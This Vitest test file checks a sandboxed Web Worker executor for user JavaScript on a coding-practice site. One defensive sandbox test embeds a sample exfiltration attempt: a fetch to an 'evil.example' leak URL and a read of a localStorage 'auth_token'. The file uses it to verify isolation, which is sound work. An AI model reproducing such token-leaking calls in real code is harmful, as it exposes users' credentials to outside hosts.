import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import vm from 'node:vm';
import {
  executeClientJS,
  formatClientJsOutput,
  buildWorkerSource,
} from './client-js-executor';
import { Question } from '@/types';

const passingCode = `function add(a, b) {
  return a + b;
}`;

const failingCode = `function add(a, b) {
  return a - b;
}`;

const errorCode = `function add(a, b) {
  throw new Error('runtime failure');
}`;

const question: Question = {
  id: '1',
  title: 'Add',
  difficulty: 'easy',
  category: 'math',
  company_tags: [],
  description: 'Add two numbers.',
  starter: {
    python: '',
    javascript: 'function add(a, b) {}',
    java: '',
    cpp: '',
    c: '',
    go: '',
    rust: '',
    typescript: '',
  },
  examples: [{ input: '1,2', output: '3' }],
  test_cases: [
    { input: '1\n2', expected_output: '3' },
    { input: '10\n20', expected_output: '30' },
    { input: '-1\n1', expected_output: '0' },
  ],
  hints: [],
  solution: '',
  time_complexity: 'O(1)',
  space_complexity: 'O(1)',
};

const questionWithVarStarter: Question = {
  ...question,
  starter: {
    python: '',
    javascript: 'var add = function(a, b) {}',
    java: '',
    cpp: '',
    c: '',
    go: '',
    rust: '',
    typescript: '',
  },
};

const questionWithConstStarter: Question = {
  ...question,
  starter: {
    python: '',
    javascript: 'const add = (a, b) => {}',
    java: '',
    cpp: '',
    c: '',
    go: '',
    rust: '',
    typescript: '',
  },
};

/**
 * jsdom has no Worker. This mock runs the real production worker source
 * in-thread, so the sandbox behaviour exercised in tests matches the browser.
 */
class MockWorker {
  static instances: MockWorker[] = [];
  static neverRespond = false;

  onmessage: ((event: { data: unknown }) => void) | null = null;
  onerror: ((event: { message: string }) => void) | null = null;
  terminated = false;
  private pending: unknown[] = [];

  constructor(_url: string) {
    MockWorker.instances.push(this);
  }

  postMessage(data: unknown) {
    if (MockWorker.neverRespond) return;
    this.pending.push(data);
    this.flush();
  }

  private flush() {
    if (!this.onmessage) return;
    while (this.pending.length) {
      const data = this.pending.shift();
      const self: {
        onmessage: ((event: { data: unknown }) => void) | null;
        postMessage: (msg: unknown) => void;
        [key: string]: unknown;
      } = {
        onmessage: null,
        postMessage: (msg: unknown) => {
          if (!this.terminated && this.onmessage) {
            this.onmessage({ data: msg });
          }
        },
      };
      self.self = self;
      try {
        // A fresh vm context has only ECMAScript builtins (no window, no
        // document, no localStorage, no fetch), mirroring a real worker.
        const sandbox: Record<string, unknown> = {
          self,
          console: { log: () => {}, error: () => {}, warn: () => {} },
        };
        vm.createContext(sandbox);
        vm.runInContext(buildWorkerSource(), sandbox);
        if (typeof self.onmessage === 'function') {
          self.onmessage({ data });
        }
      } catch (err) {
        if (this.onerror) {
          this.onerror({ message: String(err) });
        }
      }
    }
  }

  terminate() {
    this.terminated = true;
  }
}

beforeEach(() => {
  MockWorker.instances = [];
  MockWorker.neverRespond = false;
  vi.stubGlobal('Worker', MockWorker);
  vi.stubGlobal('URL', {
    ...URL,
    createObjectURL: vi.fn(() => 'blob:mock'),
    revokeObjectURL: vi.fn(),
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe('executeClientJS', () => {
  it('returns allPassed=true when all tests pass', async () => {
    const result = await executeClientJS(passingCode, question);
    expect(result.allPassed).toBe(true);
    expect(result.results).toHaveLength(3);
    for (const r of result.results) {
      expect(r.passed).toBe(true);
    }
  });

  it('returns allPassed=false when tests fail', async () => {
    const result = await executeClientJS(failingCode, question);
    expect(result.allPassed).toBe(false);
    expect(result.results[0].passed).toBe(false);
  });

  it('captures console output in logs', async () => {
    const code = `function add(a, b) {
      console.log('adding', a, b);
      return a + b;
    }`;
    const result = await executeClientJS(code, question);
    expect(result.logs.length).toBeGreaterThan(0);
    expect(result.logs.some((l) => l.includes('adding'))).toBe(true);
  });

  it('handles runtime errors in user code', async () => {
    const result = await executeClientJS(errorCode, question);
    expect(result.results[0].error).toBe('runtime failure');
    expect(result.results[0].passed).toBe(false);
  });

  it('rejects when function name cannot be determined', async () => {
    const noFnQuestion: Question = {
      ...question,
      starter: {
        python: '',
        javascript: '',
        java: '',
        cpp: '',
        c: '',
        go: '',
        rust: '',
        typescript: '',
      },
    };
    await expect(executeClientJS('const x = 42;', noFnQuestion)).rejects.toThrow(
      'Could not identify the target function name',
    );
  });

  it('detects function name from starter with var pattern', async () => {
    const result = await executeClientJS(passingCode, questionWithVarStarter);
    expect(result.allPassed).toBe(true);
  });

  it('detects function name from starter with const pattern', async () => {
    const result = await executeClientJS(passingCode, questionWithConstStarter);
    expect(result.allPassed).toBe(true);
  });

  it('handles non-JSON expected_output gracefully', async () => {
    const strQuestion: Question = {
      ...question,
      test_cases: [{ input: '"world"', expected_output: 'Hello, world' }],
      starter: {
        python: '',
        javascript: 'function greet(name) {}',
        java: '',
        cpp: '',
        c: '',
        go: '',
        rust: '',
        typescript: '',
      },
    };
    const code = `function greet(name) { return "Hello, " + name; }`;
    const result = await executeClientJS(code, strQuestion);
    expect(result.results[0].passed).toBe(true);
  });

  it('handles expected_output that is a non-JSON string', async () => {
    const strQuestion: Question = {
      ...question,
      test_cases: [{ input: '5', expected_output: 'not a json string' }],
      starter: {
        python: '',
        javascript: 'function foo(x) {}',
        java: '',
        cpp: '',
        c: '',
        go: '',
        rust: '',
        typescript: '',
      },
    };
    const code = `function foo(x) { return "not a json string"; }`;
    const result = await executeClientJS(code, strQuestion);
    expect(result.results[0].passed).toBe(true);
  });

  it('handles in-place (void) function that returns undefined', async () => {
    const rotateQuestion: Question = {
      ...question,
      test_cases: [
        { input: '[[1,2],[3,4]]', expected_output: '[[3,1],[4,2]]' },
        { input: '[[1]]', expected_output: '[[1]]' },
      ],
      starter: {
        python: '',
        javascript: 'function rotate(matrix) {}',
        java: '',
        cpp: '',
        c: '',
        go: '',
        rust: '',
        typescript: '',
      },
    };
    const code = `function rotate(matrix) {
      for (let i = 0; i < matrix.length; i++) {
        for (let j = i + 1; j < matrix[i].length; j++) {
          [matrix[i][j], matrix[j][i]] = [matrix[j][i], matrix[i][j]];
        }
      }
      for (let i = 0; i < matrix.length; i++) {
        matrix[i].reverse();
      }
    }`;
    const result = await executeClientJS(code, rotateQuestion);
    expect(result.results[0].passed).toBe(true);
    expect(result.results[1].passed).toBe(true);
    expect(result.allPassed).toBe(true);
  });

  it('uses parsedArgs[0] as actual when function returns undefined', async () => {
    const mutateQuestion: Question = {
      ...question,
      test_cases: [{ input: '[1,2,3]', expected_output: '[1,2,3,4]' }],
      starter: {
        python: '',
        javascript: 'function push(arr) {}',
        java: '',
        cpp: '',
        c: '',
        go: '',
        rust: '',
        typescript: '',
      },
    };
    const code = `function push(arr) {
      arr.push(4);
    }`;
    const result = await executeClientJS(code, mutateQuestion);
    expect(result.results[0].actual).toEqual([1, 2, 3, 4]);
  });

  it('terminates the worker after execution', async () => {
    await executeClientJS(passingCode, question);
    expect(MockWorker.instances.length).toBeGreaterThan(0);
    for (const worker of MockWorker.instances) {
      expect(worker.terminated).toBe(true);
    }
  });

  it('rejects with a timeout for infinite loops instead of hanging', async () => {
    MockWorker.neverRespond = true;
    const code = `function add(a, b) { while (true) {} }`;
    await expect(
      executeClientJS(code, question, undefined, 20),
    ).rejects.toThrow('timed out');
  });
});

describe('client-js-executor sandbox', () => {
  it('strips network and storage exfiltration surfaces from the worker', () => {
    const source = buildWorkerSource();
    const expected = [
      'self.fetch = undefined',
      'self.XMLHttpRequest = undefined',
      'self.WebSocket = undefined',
      'self.importScripts = undefined',
      'self.sendBeacon = undefined',
      'self.localStorage = undefined',
      'self.sessionStorage = undefined',
      'self.indexedDB = undefined',
      'self.caches = undefined',
    ];
    for (const line of expected) {
      expect(source).toContain(line);
    }
  });

  it('keeps user code from breaking the run while attempting exfiltration', async () => {
    const code = `function add(a, b) {
      try { if (typeof fetch !== 'undefined') fetch('https://evil.example/leak?t=' + a); } catch (e) {}
      try { if (typeof localStorage !== 'undefined') localStorage.getItem('auth_token'); } catch (e) {}
      try { if (typeof window !== 'undefined') window.document.body; } catch (e) {}
      return a + b;
    }`;
    const result = await executeClientJS(code, question);
    expect(result.allPassed).toBe(true);
  });

  it('does not expose page globals (window/document/localStorage) to user code', async () => {
    const probeCode = `function add(a, b) {
      var blocked = 0;
      if (typeof window !== 'undefined') blocked++;
      if (typeof document !== 'undefined') blocked++;
      if (typeof localStorage !== 'undefined') blocked++;
      if (typeof sessionStorage !== 'undefined') blocked++;
      if (typeof fetch !== 'undefined') blocked++;
      if (typeof XMLHttpRequest !== 'undefined') blocked++;
      return blocked;
    }`;
    const probeQuestion: Question = {
      ...question,
      test_cases: [{ input: '1\n2', expected_output: '0' }],
    };
    const result = await executeClientJS(probeCode, probeQuestion);
    expect(result.results[0].passed).toBe(true);
  });
});

describe('formatClientJsOutput', () => {
  it('includes console output when logs exist', () => {
    const output = {
      logs: ['hello', 'world'],
      results: [{ index: 1, passed: true, input: '1', expected: '3', actual: 3 }],
      allPassed: true,
    };
    const formatted = formatClientJsOutput(output, question);
    expect(formatted).toContain('Console Output');
    expect(formatted).toContain('hello');
  });

  it('formats test results with pass/fail status', () => {
    const output = {
      logs: [],
      results: [
        { index: 1, passed: true, input: '1', expected: '3', actual: 3 },
        { index: 2, passed: false, input: '2', expected: '4', actual: 2 },
      ],
      allPassed: false,
    };
    const formatted = formatClientJsOutput(output, question);
    expect(formatted).toContain('✅');
    expect(formatted).toContain('❌');
    expect(formatted).toContain('Test Case 1');
    expect(formatted).toContain('Test Case 2');
  });

  it('includes error message when result has error', () => {
    const output = {
      logs: [],
      results: [
        {
          index: 1,
          passed: false,
          input: '1',
          expected: '3',
          actual: null,
          error: 'something broke',
        },
      ],
      allPassed: false,
    };
    const formatted = formatClientJsOutput(output, question);
    expect(formatted).toContain('something broke');
  });

  it('includes test labels', () => {
    const output = {
      logs: [],
      results: [{ index: 1, passed: true, input: '1', expected: '3', actual: 3 }],
      allPassed: true,
    };
    const formatted = formatClientJsOutput(output, question);
    expect(formatted).toContain('Test Results');
    expect(formatted).toContain('Input:');
    expect(formatted).toContain('Expected Output:');
    expect(formatted).toContain('Actual Output:');
  });
});
